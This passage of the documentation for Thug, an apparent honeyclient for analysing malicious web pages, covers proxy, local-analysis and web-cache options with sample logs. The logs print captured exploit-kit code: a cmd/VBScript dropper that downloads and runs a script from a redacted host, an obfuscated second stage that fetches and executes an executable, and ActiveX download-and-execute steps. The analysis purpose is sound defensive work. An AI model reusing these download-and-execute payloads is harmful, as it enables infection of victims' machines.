        [2012-07-02 19:18:15] [AST]: Eval argument length > 64
        [2012-07-02 19:18:15] [Windows Script Host Run] Command: 
        cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B > %TEMP%\\l.vbs && %TEMP%\\l.vbs && taskkill /F /IM helpctr.exe

        [2012-07-02 19:18:15] [Windows Script Host Run - Stage 1] Code:
        cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B > %TEMP%\\l.vbs && %TEMP%\\l.vbs && taskkill /F /IM helpctr.exe
        [2012-07-02 19:18:15] [Windows Script Host Run - Stage 1] Downloading from URL http://[omitted]/data/hcp_vbs.php?f=b081d&d=0
        [2012-07-02 19:18:16] [HTTP] URL: http://[omitted]/data/hcp_vbs.php?f=b081d&d=0 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:18:16] [Windows Script Host Run - Stage 1] Saving file d26b9b1a1f667004945d1d000cf4f19e
        [2012-07-02 19:18:16] [Windows Script Host Run - Stage 2] Code:
        w=3000:x=200:y=1:z=false:a = "http://[omitted]/w.php?e=5&f=b081d":Set e = Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS")):Set f=e.GetSpecialFolder(2):b = f & "\exe.ex2":b=Replace(b,Month("2010-02-16"),"e"):OT = "GET":Set c = CreateObject(StrReverse("PTTHLMX.2LMXSM")):Set d = CreateObject(StrReverse("ertS.BDODA") & "am")  
        Set o=Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS"))
        On Error resume next
        c.open OT, a, z:c.send()  
        If c.Status = x Then  
        d.Open:d.Type = y:d.Write c.ResponseBody:d.SaveToFile b:d.Close  
        End If  
        Set w=CreateObject(StrReverse("llehS." & "tpi"&"rcSW"))
        Eval(Replace("W.ex2c b", Month("2010-02-16"), "E"))
        W.eXeC "taskkill /F /IM wm" & "player.e" & "xe":W.eXeC "taskkill /F /IM realplay.ex" & "e":Set g=o.GetFile(e.GetSpecialFolder(3-1) & "\" & StrReverse("bv.l") & "s"):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval("g.Delete")

        [2012-07-02 19:18:16] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&f=b081d
        [2012-07-02 19:18:20] [HTTP] URL: http://[omitted]/w.php?e=5&f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:18:22] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a
        [2012-07-02 19:18:22] <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" height="10" id="swf_id" width="10"><param name="movie" value="data/field.swf"></param><param name="allowScriptAccess" value="always"></param><param name="Play" value="0"></param><embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"></embed></object>
        [2012-07-02 19:18:22] <param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"></param>
        [2012-07-02 19:18:22] <param name="movie" value="data/field.swf"></param>
        [2012-07-02 19:18:22] [Navigator URL Translation] data/field.swf -->  http://[omitted]/data/field.swf
        [2012-07-02 19:18:27] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:18:28] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
        [2012-07-02 19:18:28] <param name="allowScriptAccess" value="always"></param>
        [2012-07-02 19:18:28] <param name="Play" value="0"></param>
        [2012-07-02 19:18:28] <embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"></embed>
        [2012-07-02 19:18:28] [Navigator URL Translation] data/field.swf -->  http://[omitted]/data/field.swf
        [2012-07-02 19:18:28] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:18:29] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
        [2012-07-02 19:18:29] Saving log analysis at ../logs/baa880d8d79c3488f2c0557be24cca6b/20120702191758

Comparing the following line

.. code-block:: sh

        [2012-07-02 19:18:14] [HTTP] URL: http://[omitted]/data/ap2.php (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)

with what we saw using Adobe Acrobat Reader 7.1.0

.. code-block:: sh

        [2012-07-02 19:15:36] [HTTP] URL: http://[omitted]/data/ap1.php?f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)

it's easy to realize that a different PDF file was served in this case.


Proxy support
-------------

Another really useful option is *-p (--proxy)* which allows to specify a proxy. Currently Thug
supports HTTP, SOCKS4 and SOCKS5 proxy using the following format
        
        scheme://[username:password@]host:port 
        (supported schemes: http, socks4, socks5)

This option allows Thug to make use of Tor in order to anonymize the access to a malicious 
page. The trick is quite simple and requires a Tor instance up and running. Simply run Thug
using *socks5://127.0.0.1:9050* as proxy and your real IP address will not be revealed.

.. code-block:: sh

        $ python thug.py -p socks5://127.0.0.1:9050 "http://[omitted]/main.php?page=8c6c59becaa0da07"
        [2012-07-02 19:22:14] [HTTP] URL: http://[omitted]/main.php?page=8c6c59becaa0da07 (Status: 200, Referrer: None)
        [2012-07-02 19:22:14] <applet archive="Ryp.jar" code="sIda.sIda"><param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"></param></applet>
        [2012-07-02 19:22:14] [Navigator URL Translation] Ryp.jar -->  http://[omitted]/Ryp.jar
        [2012-07-02 19:22:16] [HTTP] URL: http://[omitted]/Ryp.jar (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:22:17] Saving applet Ryp.jar
        [2012-07-02 19:22:17] ActiveXObject: msxml2.xmlhttp
        [2012-07-02 19:22:17] ActiveXObject: acropdf.pdf
        [2012-07-02 19:22:18] Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
        [2012-07-02 19:22:18] Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
        [2012-07-02 19:22:18] Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
        [2012-07-02 19:22:18] Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
        [2012-07-02 19:22:18] Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
        [2012-07-02 19:22:18] ActiveXObject: shockwaveflash.shockwaveflash.10
        [2012-07-02 19:22:18] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (adodb.stream)
        [2012-07-02 19:22:18] ActiveXObject: adodb.stream
        [2012-07-02 19:22:18] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (Shell.Application)
        [2012-07-02 19:22:18] ActiveXObject: shell.application
        [2012-07-02 19:22:18] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (msxml2.XMLHTTP)
        [2012-07-02 19:22:18] ActiveXObject: msxml2.xmlhttp
        [2012-07-02 19:22:18] [Microsoft XMLHTTP ActiveX] Fetching from URL http://[omitted]/w.php?f=b081d&e=2
        [2012-07-02 19:22:22] [HTTP] URL: http://[omitted]/w.php?f=b081d&e=2 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:22:23] [Microsoft XMLHTTP ActiveX] Saving File: d328b5a123bce1c0d20d763ad745303a
        [2012-07-02 19:22:23] [Microsoft XMLHTTP ActiveX] send
        [2012-07-02 19:22:23] [Adodb.Stream ActiveX] open
        [2012-07-02 19:22:23] [Adodb.Stream ActiveX] Write
        [2012-07-02 19:22:23] [Adodb.Stream ActiveX] SaveToFile (.//..//e9a458c.exe)
        [2012-07-02 19:22:23] [Adodb.Stream ActiveX] Close
        [2012-07-02 19:22:23] [Shell.Application ActiveX] ShellExecute command: .//..//e9a458c.exe
        [2012-07-02 19:22:23] [Navigator URL Translation] ./data/ap1.php?f=b081d -->  http://[omitted]/data/ap1.php?f=b081d
        [2012-07-02 19:22:30] [HTTP] URL: http://[omitted]/data/ap1.php?f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:22:30] Microsoft Internet Explorer HCP Scheme Detected
        [2012-07-02 19:22:30] Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
        [2012-07-02 19:22:30] [AST]: Eval argument length > 64
        [2012-07-02 19:22:30] [Windows Script Host Run] Command: 
        cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B > %TEMP%\\l.vbs && %TEMP%\\l.vbs && taskkill /F /IM helpctr.exe

        [2012-07-02 19:22:30] [Windows Script Host Run - Stage 1] Code:
        cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B > %TEMP%\\l.vbs && %TEMP%\\l.vbs && taskkill /F /IM helpctr.exe
        [2012-07-02 19:22:30] [Windows Script Host Run - Stage 1] Downloading from URL http://[omitted]/data/hcp_vbs.php?f=b081d&d=0
        [2012-07-02 19:22:32] [HTTP] URL: http://[omitted]/data/hcp_vbs.php?f=b081d&d=0 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:22:32] [Windows Script Host Run - Stage 1] Saving file d26b9b1a1f667004945d1d000cf4f19e
        [2012-07-02 19:22:32] [Windows Script Host Run - Stage 2] Code:
        w=3000:x=200:y=1:z=false:a = "http://[omitted]/w.php?e=5&f=b081d":Set e = Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS")):Set f=e.GetSpecialFolder(2):b = f & "\exe.ex2":b=Replace(b,Month("2010-02-16"),"e"):OT = "GET":Set c = CreateObject(StrReverse("PTTHLMX.2LMXSM")):Set d = CreateObject(StrReverse("ertS.BDODA") & "am")  
        Set o=Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS"))
        On Error resume next
        c.open OT, a, z:c.send()  
        If c.Status = x Then  
        d.Open:d.Type = y:d.Write c.ResponseBody:d.SaveToFile b:d.Close  
        End If  
        Set w=CreateObject(StrReverse("llehS." & "tpi"&"rcSW"))
        Eval(Replace("W.ex2c b", Month("2010-02-16"), "E"))
        W.eXeC "taskkill /F /IM wm" & "player.e" & "xe":W.eXeC "taskkill /F /IM realplay.ex" & "e":Set g=o.GetFile(e.GetSpecialFolder(3-1) & "\" & StrReverse("bv.l") & "s"):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval("g.Delete")

        [2012-07-02 19:22:32] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&f=b081d
        [2012-07-02 19:22:38] [HTTP] URL: http://[omitted]/w.php?e=5&f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:22:39] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a
        [2012-07-02 19:22:39] <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" height="10" id="swf_id" width="10"><param name="movie" value="data/field.swf"></param><param name="allowScriptAccess" value="always"></param><param name="Play" value="0"></param><embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"></embed></object>
        [2012-07-02 19:22:39] <param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"></param>
        [2012-07-02 19:22:39] <param name="movie" value="data/field.swf"></param>
        [2012-07-02 19:22:39] [Navigator URL Translation] data/field.swf -->  http://[omitted]/data/field.swf
        [2012-07-02 19:22:46] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:22:46] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
        [2012-07-02 19:22:46] <param name="allowScriptAccess" value="always"></param>
        [2012-07-02 19:22:46] <param name="Play" value="0"></param>
        [2012-07-02 19:22:46] <embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"></embed>
        [2012-07-02 19:22:46] [Navigator URL Translation] data/field.swf -->  http://[omitted]/data/field.swf
        [2012-07-02 19:22:49] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:22:49] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
        [2012-07-02 19:22:49] Saving log analysis at ../logs/baa880d8d79c3488f2c0557be24cca6b/20120702192212


Local Analysis
--------------

May you need to analyze a locally saved page Thug provides the *-l (--local)* option to you.
Using such option is really simple and could turn to be really useful for testing and for 
later (manual or automated) analysis (see also *Web Cache*)

.. code-block:: sh

        $ python thug.py -l ../samples/exploits/4042.html 
        [2012-07-03 00:12:23] <object classid="clsid:DCE2F8B1-A520-11D4-8FD0-00D0B7730277" id="target"></object>
        [2012-07-03 00:12:23] ActiveXObject: DCE2F8B1-A520-11D4-8FD0-00D0B7730277
        [2012-07-03 00:12:23] [Yahoo! Messenger 8.x Ywcvwr ActiveX] Server Console Overflow
        [2012-07-03 00:12:23] UINT WINAPI WinExec (
                LPCSTR = 0x025d4b30 => 
                        = "calc.exe";
                UINT uCmdShow = 0;
        ) =  32;
        void ExitProcess (
                UINT uExitCode = 0;
        ) =  0;

        [2012-07-03 00:12:23] Saving log analysis at ../logs/c8f4c752383eb87ac4381a4f3f101ca7/20120703001222


Web Cache
---------

Another interesting feature which may turn to be useful for later (manual or automated) analysis
is the Web Cache. Thug stores the raw file downloaded during the analysis in a directory 
named */tmp/thug-cache-NNNN* with NNNN being the UID of the user running Thug.   

.. code-block:: sh

        $ cd /tmp/thug-cache-1000/
        $ ls -lh
        total 356K
        -rw-r--r-- 1 buffer buffer  15K Jul  2 19:22 [omitted],data,ap1.php,f=b081d,cd73e46d5d3ac64d00553aa7393808fc
        -rw-r--r-- 1 buffer buffer  25K Jul  2 19:18 [omitted],data,ap2.php,39e5c34cd8c8c8791e2715c83f6a9cf3
        -rw-r--r-- 1 buffer buffer 1.3K Jul  2 19:22 [omitted],data,field.swf,0887e8c1673cec525ce8aa694192e9c7
        -rw-r--r-- 1 buffer buffer 1.1K Jul  2 19:22 [omitted],data,hcp_vbs.php,f=b081d&d=0,eec4de0470135e1d5de7eb1a76f2624b
        -rw-r--r-- 1 buffer buffer  68K Jul  2 19:22 [omitted],main.php,page=8c6c59becaa0da07,baa880d8d79c3488f2c0557be24cca6b
        -rw-r--r-- 1 buffer buffer  51K Jul  2 19:22 [omitted],Ryp.jar,1cc224d259fd079dc8fc964de421c9dd
        -rw-r--r-- 1 buffer buffer  90K Jul  2 19:22 [omitted],w.php,e=5&f=b081d,6aa8d9e4db0d7b4433e791c898e7090e
        -rw-r--r-- 1 buffer buffer  90K Jul  2 19:22 [omitted],w.php,f=b081d&e=2,af58f45673d97ba4643bb1c87c4505b2

